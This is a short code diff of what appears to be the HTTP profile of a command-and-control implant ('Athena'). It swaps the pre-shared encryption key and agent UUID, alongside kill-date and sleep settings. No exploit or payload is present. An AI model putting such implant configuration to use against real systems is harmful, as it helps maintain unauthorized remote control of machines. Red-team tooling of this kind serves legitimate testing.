@@ -56,8 +56,8 @@ namespace Athena.Profiles.HTTP
             this.proxyHost = ":";
             this.proxyPass = "q";
             this.proxyUser = "";
-            this.psk = "qPoh3l1U0rxnF9tHYpSL8LnhRmfVqTUNh6NkebHFMLw=";
-            this.uuid = "56e59d4e-674c-41b1-ad88-c22bdcb108b7";
+            this.psk = "+xtYlPjAdcr1Gq1BXUHudeP0agcDhDFle4OdPbc77g8=";
+            this.uuid = "3fbd4d72-cbc3-4985-b0c9-51e5a65d6455";
             DateTime kd = DateTime.TryParse("2024-03-12", out kd) ? kd : DateTime.MaxValue;
             this.killDate = kd;
             int sleep = int.TryParse("10", out sleep) ? sleep : 60;
